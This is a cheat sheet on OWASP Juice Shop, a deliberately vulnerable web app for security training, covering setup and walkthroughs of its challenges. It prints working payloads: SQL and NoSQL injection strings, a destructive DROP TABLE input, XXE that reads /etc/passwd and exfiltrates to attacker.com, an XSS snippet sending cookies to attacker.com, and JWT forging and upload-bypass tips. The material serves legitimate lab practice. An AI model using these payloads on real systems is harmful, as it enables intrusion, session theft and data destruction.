# OWASP Juice Shop intermediate

OWASP Juice Shop is a deliberately insecure web application designed for security training, written in Node.js, Express, and Angular. It features 100+ hacking challenges covering OWASP Top 10 and modern web vulnerabilities, playable as a CTF with scoring.

## Installation and Setup

### Docker Installation (Recommended)

```bash
# Pull latest Juice Shop image
docker pull bkimminich/juice-shop

# Run container with port mapping
docker run -d -p 3000:3000 --name juice-shop bkimminich/juice-shop

# Access application
# http://localhost:3000
```

### Docker Compose

```yaml
version: '3'
services:
  juice-shop:
    image: bkimminich/juice-shop:latest
    ports:
      - "3000:3000"
    environment:
      - NODE_ENV=production
    volumes:
      - juice-shop-data:/tmp
volumes:
  juice-shop-data:
```

```bash
docker-compose up -d
```

### Local Installation

```bash
# Install Node.js 14+
# https://nodejs.org/

# Clone repository
git clone https://github.com/juice-shop/juice-shop.git
cd juice-shop

# Install dependencies
npm install

# Start application
npm start

# Access at http://localhost:3000
```

### From Source (Development)

```bash
# Clone and setup
git clone https://github.com/juice-shop/juice-shop.git
cd juice-shop

# Install dependencies
npm install

# Run with npm
npm start

# Run in debug mode
npm run start:debug

# Run tests
npm test
```

## Initial Navigation

### Account Creation and Login

```bash
# Access http://localhost:3000
# Click "Account" > "Create new account"

# Set username, email, password, and security question
# Common security questions:
# - What is your pet's name?
# - What city were you born in?
# - Your mother's maiden name?

# Login with created account
# Store credentials for later use
```

### Dashboard and Challenges

```bash
# After login, access Score Board
# Click the "Score Board" link (if visible)
# Shows challenge list, hints, and difficulty ratings

# Challenges appear in order of relative difficulty
# Green star: Beginner level
# Yellow star: Intermediate level
# Red star: Advanced level
```

## Challenge Categories and Exploitation

### Broken Authentication

| Challenge | Difficulty | Objective |
| --- | --- | --- |
| Weak Password | * | Login with weak credentials |
| SQL Injection Login | ** | Bypass login with SQLi |
| Admin Login | *** | Access admin account |
| JWT Secret | *** | Crack or forge JWT tokens |

### Broken Authentication Exploitation

```bash
# Admin login with weak password
# Default: admin / admin123

# SQL injection in login
# Username: ' OR '1'='1
# Password: ' OR '1'='1

# Weak password enumeration
# Common admin passwords: admin, password, 123456

# JWT token manipulation
# Extract token from localStorage
# Decode JWT: https://jwt.io
# Modify claims and resign if secret is weak

# Test JWT secret
# Common weak secrets: secret, password, key, default
```

### Sensitive Data Exposure

| Challenge | Difficulty | Objective |
| --- | --- | --- |
| Confidential Data | * | Find sensitive information |
| PII Exposure | ** | Locate personal data |
| Database Dump | *** | Extract database contents |
| Backup Files | ** | Find and access backup files |

### Sensitive Data Exploitation

```bash
# Check /assets/ folder
# Look for PDFs, images, documents
# curl http://localhost:3000/assets/

# Inspect JavaScript files
# http://localhost:3000/js/
# Look for API endpoints, tokens, credentials

# Check environment variables
# Look at page source for leaked secrets
# Browser DevTools > Application > LocalStorage

# Traverse directory structure
# /assets/docs/
# /assets/data/

# Check git history
# If .git exposed: http://localhost:3000/.git/
```

### Injection Vulnerabilities

### SQL Injection

```bash
# Authentication bypass
' OR '1'='1' --
' OR 1=1 --
admin' --

# Union-based SQLi
' UNION SELECT null,null,null,null --
' UNION SELECT id,email,password,username FROM users --

# Time-based blind SQLi
' AND SLEEP(5) --
' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --

# Boolean-based blind SQLi
' AND '1'='1
' AND '1'='2
```

### NoSQL Injection

```bash
# MongoDB injection (common in Node.js apps)
# In login form inject:
{"$ne": null}
{"$gt": ""}

# Payload:
username: {"$ne": null}
password: {"$ne": null}

# Query becomes: {username: {$ne: null}, password: {$ne: null}}
```

### XML/XXE Injection

```bash
# Basic XXE
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>

# With data exfiltration
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY % all "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?p=%xxe;'>">
%all;
]>
<foo>&exfiltrate;</foo>
```

## Cross-Site Scripting (XSS)

| Type | Difficulty | Impact |
| --- | --- | --- |
| Reflected XSS | * | Session hijacking |
| Stored XSS | ** | Persistent malware |
| DOM-based XSS | ** | Client-side exploitation |
| Event-based XSS | ** | Automatic script execution |

### XSS Exploitation

```bash
# Simple reflected XSS
<script>alert('XSS')</script>

# Cookie stealing
<script>
fetch('http://attacker.com/steal?c='+document.cookie);
</script>

# Image-based XSS
<img src=x onerror="alert('XSS')">

# SVG-based XSS
<svg onload="alert('XSS')">

# Event handler XSS
<body onload="alert('XSS')">
<input autofocus onfocus="alert('XSS')">

# Polyglot payload
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//

# DOM-based XSS
# Modify URL hash: #<script>alert('XSS')</script>
```

## Broken Access Control

### Path Traversal

```bash
# Access restricted files
# /ftp/../admin
# /ftp/..%2fadmin

# Common paths to test
/admin
/administrator
/login
/user
/private
/confidential
```

### Insecure Direct Object References (IDOR)

```bash
# Modify user ID in URL
# http://localhost:3000/user/1
# http://localhost:3000/user/2
# http://localhost:3000/user/3

# Test parameter manipulation
# /api/user/123 > change to /api/user/124
# /order/001 > change to /order/002
```

### Authorization Bypass

```bash
# Test privilege escalation
# Access admin panel without admin privileges
# Modify user role in JWT token
# Manipulate API requests to access protected resources

# Check HTTP methods
# PUT, DELETE on restricted endpoints
# POST with missing authentication
```

## Security Misconfiguration

### Directory Listing

```bash
# Check for enabled directory listing
# curl http://localhost:3000/assets/
# curl http://localhost:3000/public/

# Common exposed directories
/admin
/backup
/config
/data
/private
/uploads
```

### Insecure Dependencies

```bash
# Check package.json for vulnerable packages
# npm audit
# npm audit fix

# Common vulnerable packages
# lodash < 4.17.21
# express < 4.16.0
# mongoose < 5.1.4
```

## Cryptographic Failures

### Weak Encryption

```bash
# Test for unencrypted sensitive data
# Check network traffic (Burp Suite)
# Look for plaintext passwords, tokens, PII

# Test weak hashing
# MD5: echo -n 'password' | md5sum
# SHA1: echo -n 'password' | sha1sum

# Crack weak hashes
# Online: https://crackstation.net/
# Offline: hashcat, john the ripper
```

### JWT Vulnerabilities

```bash
# Extract JWT from localStorage or cookies
# DevTools > Application > Storage > LocalStorage

# Decode JWT at jwt.io
# Check algorithm: "typ": "JWT"

# Test weak secrets
# Try common secrets: secret, password, 123456

# Verify token manipulation
# Change algorithm to "none"
# Modify claims
# Resign token if secret is known
```

## Business Logic Vulnerabilities

### Price Manipulation

```bash
# Intercept shopping cart with Burp Suite
# Modify item price in request
# Example: price=1 (instead of actual price)

# Test for total recalculation
# Add item with modified price
# Check if discount applies incorrectly

# Exploit coupon logic
# Test invalid coupons: ""
# Test coupon reuse
# Test multiple coupons stacking
```

### Broken Workflow

```bash
# Bypass checkout process
# Skip payment verification
# Access pages out of order
# Re-submit orders with modified values
```

## Using Burp Suite with Juice Shop

### Setup Intercept

```bash
# 1. Start Burp Suite
# 2. Configure browser proxy: localhost:8080
# 3. Navigate to http://localhost:3000
# 4. Intercept requests in Burp

# 5. Modify requests
# Change parameters
# Inject payloads
# Modify headers

# 6. Send to Repeater for testing
# 7. Use Intruder for brute force/scanning
```

### Useful Burp Workflows

```bash
# 1. Find injection points
# Intruder > Positions > Cluster bomb
# Set payload: fuzzing/Special Characters

# 2. SQL injection detection
# Payload: '; DROP TABLE users; --

# 3. XSS testing
# Payload: <script>alert(1)</script>

# 4. Authentication bypass
# Intruder > Payload > Wordlists
# Common usernames/passwords
```

## CTF Mode and Scoring

### CTF Configuration

```bash
# Enable CTF mode (if available)
# Challenges worth different points
# Difficulty multiplier affects scoring
# Real-time leaderboard

# Access Score Board
# View solved challenges
# View hints for unsolved challenges
# See difficulty rating and points
```

### Points and Ranking

```plaintext
Difficulty Multiplier:
* = 1x points
** = 2x points
*** = 3x points

Example scoring:
- Simple challenge (100 points) = 100
- Medium challenge (100 points) = 200
- Hard challenge (100 points) = 300
```

## Hacking Tips and Tricks

### Browser DevTools

```bash
# Open DevTools: F12 or Ctrl+Shift+I
# Console: Execute JavaScript
# Network: Monitor API calls
# Storage: View cookies, localStorage, sessionStorage
# Elements: Inspect HTML/CSS

# Common checks:
# Look for <script> tags with secrets
# Check API endpoints in Network tab
# Examine localStorage for tokens
```

### Useful Commands

```bash
# From browser console
# List all cookies
document.cookie

# Get localStorage
localStorage
localStorage.getItem('key')

# Decode base64
atob('base64string')
btoa('plaintext')

# Fetch API endpoints
fetch('/api/endpoint').then(r => r.json()).then(d => console.log(d))
```

## Common Challenges

### Challenge: Admin Section Not Found

- Tip: Check /admin, /administrator, /dashboard

- Check API endpoints for admin functions

- Test path traversal and IDOR

### Challenge: Can't Crack Password

- Tip: Passwords may be salted and hashed

- Use SQL injection to bypass

- Check for weak password in hints

### Challenge: Token Invalid Error

- Tip: Token may be JWT

- Decode at jwt.io

- Check algorithm and secret

- Modify claims if needed

### Challenge: File Upload Blocked

- Tip: Test MIME type bypass

- Try alternative extensions (.php5, .phtml)

- Upload with polyglot formats

- Use null bytes (old versions)

## Challenge List (Sample)

| # | Challenge | Difficulty | Category |
| --- | --- | --- | --- |
| 1 | Login Admin | * | Authentication |
| 2 | Confidential Data | * | Sensitive Data |
| 3 | Weak Password | * | Authentication |
| 4 | SQL Injection | ** | Injection |
| 5 | XSS Reflected | * | XSS |
| 6 | CSRF | ** | CSRF |
| 7 | Directory Traversal | ** | Access Control |
| 8 | IDOR | ** | Access Control |
| 9 | Broken Access | *** | Authorization |
| 10 | JWT Secret | *** | Cryptography |

## Best Practices

- Start with easy challenges (1 star)

- Progress to intermediate (2 stars)

- Tackle hard challenges (3 stars) last

- Use hints if stuck (deducts points)

- Document findings and techniques

- Practice multiple solutions

- Compare approaches with others

- Review secure coding fixes

- Test in safe environment only

- Keep learning new attack vectors

## Resources

- [OWASP Juice Shop GitHub](https://github.com/juice-shop/juice-shop)

- [Juice Shop CTF](https://juice-shop-ctf.herokuapp.com/)

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)

- [PortSwigger Web Security Academy](https://portswigger.net/web-security)

- [HackTheBox](https://www.hackthebox.com/)

- [TryHackMe](https://tryhackme.com/)

---

_Last updated: 2026-03-30_

Source: https://1337skills.com/cheatsheets/juice-shop/
